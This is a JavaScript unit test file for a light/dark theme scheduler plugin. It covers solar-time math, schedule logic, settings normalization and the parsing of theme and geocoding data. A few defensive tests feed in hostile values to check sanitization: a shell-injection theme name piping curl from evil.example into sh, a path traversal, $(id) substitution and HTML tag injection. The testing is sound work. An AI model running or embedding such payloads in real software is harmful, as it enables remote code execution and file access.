// node tests/model.test.js
// Runs the pure half of Darky: solar times, schedule resolution, settings shape.

var assert = require("assert")
var Model = require("../Model.js")

var failures = 0
var passes = 0

function test(name, body) {
  try {
    body()
    passes++
  } catch (error) {
    failures++
    console.error("FAIL " + name)
    console.error("     " + error.message)
  }
}

function athens() {
  return { name: "Athens", latitude: 37.9, longitude: 23.7, timezone: "Europe/Athens" }
}

function hhmm(date) {
  function pad(value) { return value < 10 ? "0" + value : String(value) }
  return pad(date.getHours()) + ":" + pad(date.getMinutes())
}

// --------------------------------------------------------------- solar math

test("Athens sunrise and sunset match the darkman schedule we are replacing", function () {
  // Ground truth is darkman's own journal for the days around the cutover, so
  // a regression here means the desktop would change appearance at a different
  // moment than it does today.
  var logged = [
    { date: "2026-08-17", sunset: "2026-08-17T20:15:40.324+03:00" },
    { date: "2026-08-18", sunrise: "2026-08-18T06:43:11.436+03:00", sunset: "2026-08-18T20:14:21.868+03:00" },
    { date: "2026-08-19", sunrise: "2026-08-19T06:44:03.341+03:00" }
  ]
  logged.forEach(function (entry) {
    var day = Model.solarDay(37.9, 23.7, Model.currentCycle(23.7, new Date(entry.date + "T12:00:00+03:00")))
    ;["sunrise", "sunset"].forEach(function (event) {
      if (!entry[event]) return
      var drift = Math.abs(day[event].getTime() - new Date(entry[event]).getTime()) / 1000
      assert.ok(drift < 60, entry.date + " " + event + " drifted " + Math.round(drift) + "s from darkman")
    })
  })
})

test("sunrise moves later and sunset earlier as August runs out", function () {
  var first = Model.solarDay(37.9, 23.7, Model.currentCycle(23.7, new Date("2026-08-17T12:00:00+03:00")))
  var last = Model.solarDay(37.9, 23.7, Model.currentCycle(23.7, new Date("2026-08-31T12:00:00+03:00")))
  assert.ok(last.sunrise.getTime() % Model.DAY_MS !== first.sunrise.getTime() % Model.DAY_MS)
  assert.ok(hhmm(last.sunrise) > hhmm(first.sunrise), "sunrise should slip later")
  assert.ok(hhmm(last.sunset) < hhmm(first.sunset), "sunset should come earlier")
})

test("solstices bracket the year at a northern latitude", function () {
  var june = Model.solarDay(37.9, 23.7, Model.currentCycle(23.7, new Date("2026-06-21T12:00:00+03:00")))
  var december = Model.solarDay(37.9, 23.7, Model.currentCycle(23.7, new Date("2026-12-21T12:00:00+02:00")))
  var juneLength = june.sunset - june.sunrise
  var decemberLength = december.sunset - december.sunrise
  assert.ok(juneLength > 14.5 * 3600000 && juneLength < 15 * 3600000, "June day was " + juneLength / 3600000 + "h")
  assert.ok(decemberLength > 9.2 * 3600000 && decemberLength < 9.8 * 3600000, "December day was " + decemberLength / 3600000 + "h")
})

test("the southern hemisphere gets the opposite season", function () {
  var day = Model.solarDay(-33.87, 151.21, Model.currentCycle(151.21, new Date("2026-06-21T12:00:00+10:00")))
  var length = day.sunset - day.sunrise
  assert.ok(length < 10.5 * 3600000, "Sydney midwinter day was " + length / 3600000 + "h")
})

test("polar day and polar night report no events", function () {
  var summer = Model.solarDay(78.2, 15.6, Model.currentCycle(15.6, new Date("2026-06-21T12:00:00Z")))
  var winter = Model.solarDay(78.2, 15.6, Model.currentCycle(15.6, new Date("2026-12-21T12:00:00Z")))
  assert.strictEqual(summer.polar, "day")
  assert.strictEqual(summer.sunrise, null)
  assert.strictEqual(winter.polar, "night")
  assert.strictEqual(winter.sunset, null)
})

// ---------------------------------------------------------------- schedule

test("midday is light and midnight is dark on a solar schedule", function () {
  var config = { schedule: "solar", location: athens() }
  var noon = Model.scheduleState(config, new Date("2026-08-17T12:00:00+03:00"))
  var night = Model.scheduleState(config, new Date("2026-08-17T23:00:00+03:00"))
  assert.strictEqual(noon.mode, "light")
  assert.strictEqual(noon.source, "solar")
  assert.strictEqual(noon.nextEvent, "sunset")
  assert.strictEqual(night.mode, "dark")
  assert.strictEqual(night.nextEvent, "sunrise")
})

test("the next solar transition is this evening's sunset", function () {
  var state = Model.scheduleState({ schedule: "solar", location: athens() },
                                  new Date("2026-08-17T12:00:00+03:00"))
  assert.strictEqual(state.nextEvent, "sunset")
  // Solar events are instants, so this holds wherever the machine clock is set.
  assert.ok(Math.abs(state.next.getTime() - new Date("2026-08-17T20:15:40+03:00").getTime()) < 60000)
})

test("a polar location falls back to fixed times and says so", function () {
  var state = Model.scheduleState(
    { schedule: "solar", dayStart: "07:00", nightStart: "19:00",
      location:     { name: "Longyearbyen", latitude: 78.2, longitude: 15.6 } },
    new Date(2026, 5, 21, 12, 0))
  assert.strictEqual(state.source, "fixed-fallback")
  assert.strictEqual(state.mode, "light")
})

test("fixed times switch on the configured minute", function () {
  var config = { schedule: "fixed", dayStart: "07:00", nightStart: "19:00" }
  assert.strictEqual(Model.scheduleState(config, new Date(2026, 7, 17, 6, 59)).mode, "dark")
  assert.strictEqual(Model.scheduleState(config, new Date(2026, 7, 17, 7, 0)).mode, "light")
  assert.strictEqual(Model.scheduleState(config, new Date(2026, 7, 17, 18, 59)).mode, "light")
  assert.strictEqual(Model.scheduleState(config, new Date(2026, 7, 17, 19, 0)).mode, "dark")
})

test("fixed times may run night-first across midnight", function () {
  var config = { schedule: "fixed", dayStart: "22:00", nightStart: "05:00" }
  assert.strictEqual(Model.scheduleState(config, new Date(2026, 7, 17, 23, 0)).mode, "light")
  assert.strictEqual(Model.scheduleState(config, new Date(2026, 7, 17, 4, 0)).mode, "light")
  assert.strictEqual(Model.scheduleState(config, new Date(2026, 7, 17, 12, 0)).mode, "dark")
})

test("the next fixed transition rolls to tomorrow once today's has passed", function () {
  var state = Model.scheduleState({ schedule: "fixed", dayStart: "07:00", nightStart: "19:00" },
                                  new Date(2026, 7, 17, 20, 0))
  assert.strictEqual(state.next.getDate(), 18)
  assert.strictEqual(hhmm(state.next), "07:00")
})

// ---------------------------------------------------------------- settings

test("settings normalize to a complete, safe shape", function () {
  var config = Model.normalizeSettings({ mode: "bogus", dayStart: "25:00", light: { theme: "Tokyo Night" } })
  assert.strictEqual(config.mode, "auto")
  assert.strictEqual(config.dayStart, "07:00")
  assert.strictEqual(config.light.theme, "tokyo-night")
  assert.strictEqual(config.dark.theme, "tokyo-night")
  assert.strictEqual(config.light.background, "")
})

test("theme names are stripped to what a directory name may hold", function () {
  // light-dark.conf is read with `source` by scripts outside this plugin, so a
  // slug carrying shell punctuation would be a command waiting to run.
  var injected = Model.normalizeSettings({ light: { theme: "white; curl evil.example | sh" } })
  assert.strictEqual(injected.light.theme, "white-curl-evil.example--sh")

  var traversal = Model.normalizeSettings({ dark: { theme: "../../etc" } })
  assert.strictEqual(traversal.dark.theme, "etc")

  assert.strictEqual(Model.normalizeSettings({ light: { theme: ".." } }).light.theme, "white")
  assert.strictEqual(Model.normalizeSettings({ dark: { theme: "$(id)" } }).dark.theme, "id")
})

test("a solar schedule without a location downgrades to fixed", function () {
  assert.strictEqual(Model.normalizeSettings({ schedule: "solar" }).schedule, "fixed")
  assert.strictEqual(Model.normalizeSettings({ schedule: "solar", location: athens() }).schedule, "solar")
})

test("identical day and night times are rejected as a pair", function () {
  var config = Model.normalizeSettings({ schedule: "fixed", dayStart: "08:00", nightStart: "08:00" })
  assert.strictEqual(config.dayStart, "07:00")
  assert.strictEqual(config.nightStart, "19:00")
})

test("unreadable settings still produce defaults", function () {
  assert.deepStrictEqual(Model.parseSettings("{ not json"), Model.normalizeSettings(null))
})

test("changes are classified as schedule or pair, not both", function () {
  var base = { schedule: "solar", location: athens(), light: { theme: "white" }, dark: { theme: "nord" } }
  var moved = { schedule: "solar", location: { name: "Berlin", latitude: 52.5, longitude: 13.4 },
                light: { theme: "white" }, dark: { theme: "nord" } }
  var repainted = { schedule: "solar", location: athens(), light: { theme: "white" }, dark: { theme: "gruvbox" } }
  assert.strictEqual(Model.scheduleChanged(base, moved), true)
  assert.strictEqual(Model.pairChanged(base, moved), false)
  assert.strictEqual(Model.scheduleChanged(base, repainted), false)
  assert.strictEqual(Model.pairChanged(base, repainted), true)
})

// ------------------------------------------------------------------- modes

test("pins beat the schedule and pause beats everything", function () {
  assert.strictEqual(Model.effectiveMode("day", "dark", ""), "light")
  assert.strictEqual(Model.effectiveMode("night", "light", ""), "dark")
  assert.strictEqual(Model.effectiveMode("auto", "light", ""), "light")
  assert.strictEqual(Model.effectiveMode("auto", "light", "dark"), "dark")
  assert.strictEqual(Model.effectiveMode("paused", "light", "dark"), "")
})

test("an override only counts until its expiry", function () {
  var saved = Model.parseOverride('{"mode":"dark","expiresAt":"2026-08-17T20:15:00+03:00"}')
  assert.strictEqual(saved.mode, "dark")
  assert.strictEqual(Model.overrideExpired(saved.expiresAt, new Date("2026-08-17T20:00:00+03:00")), false)
  assert.strictEqual(Model.overrideExpired(saved.expiresAt, new Date("2026-08-17T20:16:00+03:00")), true)
  assert.strictEqual(Model.parseOverride('{"mode":"grey"}'), null)
  assert.strictEqual(Model.parseOverride("nonsense"), null)
})

test("transition delays stay inside a Qt timer interval", function () {
  var now = new Date("2026-08-17T12:00:00+03:00")
  assert.strictEqual(Model.transitionDelay(new Date("2026-08-17T11:59:00+03:00"), now), 1000)
  assert.strictEqual(Model.transitionDelay(new Date("2026-08-17T12:00:30+03:00"), now), 30000)
  assert.strictEqual(Model.transitionDelay(new Date("2026-08-17T13:00:00+03:00"), now), 3600000)
  assert.ok(Model.transitionDelay(new Date("2100-01-01T00:00:00Z"), now) <= 2147483647)
  assert.strictEqual(Model.transitionDelay("not a date", now), -1)
})

// ------------------------------------------------------------------ ribbon

test("the day ribbon places sunrise, sunset and now on one strip", function () {
  var now = new Date(2026, 7, 17, 12, 0)
  var state = Model.scheduleState({ schedule: "solar", location: athens() }, now)
  var ribbon = Model.dayRibbon(state, now)
  function minuteOfDay(date) { return date.getHours() * 60 + date.getMinutes() }
  // Whether Athens' sun rises and sets inside the machine's own calendar day
  // depends on the machine clock, so only assert the events the strip has.
  if (state.sunrise)
    assert.ok(Math.abs(ribbon.dayStart * 1440 - minuteOfDay(state.sunrise)) < 1, "sunrise fraction " + ribbon.dayStart)
  if (state.sunset)
    assert.ok(Math.abs(ribbon.nightStart * 1440 - minuteOfDay(state.sunset)) < 1, "sunset fraction " + ribbon.nightStart)
  assert.strictEqual(ribbon.now, 0.5)
})

test("the ribbon knows a night-first fixed schedule wraps midnight", function () {
  var ribbon = Model.dayRibbon({ dayStart: "22:00", nightStart: "05:00" }, new Date(2026, 7, 17, 12, 0))
  assert.strictEqual(ribbon.wraps, true)
})

test("clock labels follow the 12/24 hour preference", function () {
  var when = new Date(2026, 7, 17, 20, 15)
  assert.strictEqual(Model.clockLabel(when, true), "20:15")
  assert.strictEqual(Model.clockLabel(when, false), "8:15 PM")
  assert.strictEqual(Model.clockLabel(null, true), "—")
})

test("relative labels round to something a human would say", function () {
  var now = new Date(2026, 7, 17, 12, 0)
  assert.strictEqual(Model.relativeLabel(new Date(2026, 7, 17, 12, 40), now), "in 40 min")
  assert.strictEqual(Model.relativeLabel(new Date(2026, 7, 17, 15, 30), now), "in 3h 30m")
  assert.strictEqual(Model.relativeLabel(new Date(2026, 7, 17, 11, 0), now), "now")
})

// ------------------------------------------------------------------- scans

test("the theme scan is sorted, defaulted and slugged", function () {
  var scan = Model.parseThemeScan(JSON.stringify({
    current: "Tokyo Night",
    themes: [
      { slug: "tokyo-night", name: "Tokyo Night", mode: "dark", background: "#1a1b26", foreground: "#a9b1d6", accent: "#7aa2f7", backgrounds: ["/a.jpg"] },
      { slug: "white", name: "White", mode: "light", background: "#ffffff", foreground: "#000000" },
      { slug: "", name: "broken" }
    ]
  }))
  assert.strictEqual(scan.themes.length, 2)
  assert.strictEqual(scan.themes[0].name, "Tokyo Night")
  assert.strictEqual(scan.current, "tokyo-night")
  assert.deepStrictEqual(scan.themes[1].backgrounds, [])
  assert.strictEqual(Model.themeBySlug(scan.themes, "White").mode, "light")
  assert.strictEqual(Model.themesForMode(scan.themes, "light").length, 1)
})

test("an unusable theme scan is empty rather than broken", function () {
  var scan = Model.parseThemeScan("nope")
  assert.deepStrictEqual(scan.themes, [])
  assert.strictEqual(scan.current, "")
})

test("geocoding results carry a readable name and a timezone", function () {
  var results = Model.parseGeocoding(JSON.stringify({
    results: [
      { name: "Athens", admin1: "Attica", country: "Greece", latitude: 37.98, longitude: 23.73, timezone: "Europe/Athens" },
      { name: "Nowhere", latitude: 999, longitude: 0 }
    ]
  }))
  assert.strictEqual(results.length, 1)
  assert.strictEqual(results[0].name, "Athens, Attica, Greece")
  assert.strictEqual(results[0].timezone, "Europe/Athens")
})

test("a geocoding reply cannot flood the panel with rows", function () {
  // One delegate per result, in the process that draws the whole desktop: the
  // parser hands over no more than the five the query asked for.
  var many = []
  for (var i = 0; i < 5000; i++)
    many.push({ name: "Town " + i, latitude: 10, longitude: 10, timezone: "UTC" })
  assert.strictEqual(Model.parseGeocoding(JSON.stringify({ results: many })).length, 5)
})

test("names from outside are plain text by the time they are labels", function () {
  var results = Model.parseGeocoding(JSON.stringify({
    results: [{
      name: "<img src=\"http://tracker.example/x.png\">",
      country: "<b>Nowhere</b>",
      latitude: 10, longitude: 10, timezone: "UTC"
    }]
  }))
  assert.strictEqual(results[0].name.indexOf("<"), -1)

  var scan = Model.parseThemeScan(JSON.stringify({
    themes: [{ slug: "white", name: "<img src=x>", mode: "light" }]
  }))
  assert.strictEqual(scan.themes[0].name.indexOf("<"), -1)
})

console.log(passes + " passed, " + failures + " failed")
process.exit(failures === 0 ? 0 : 1)
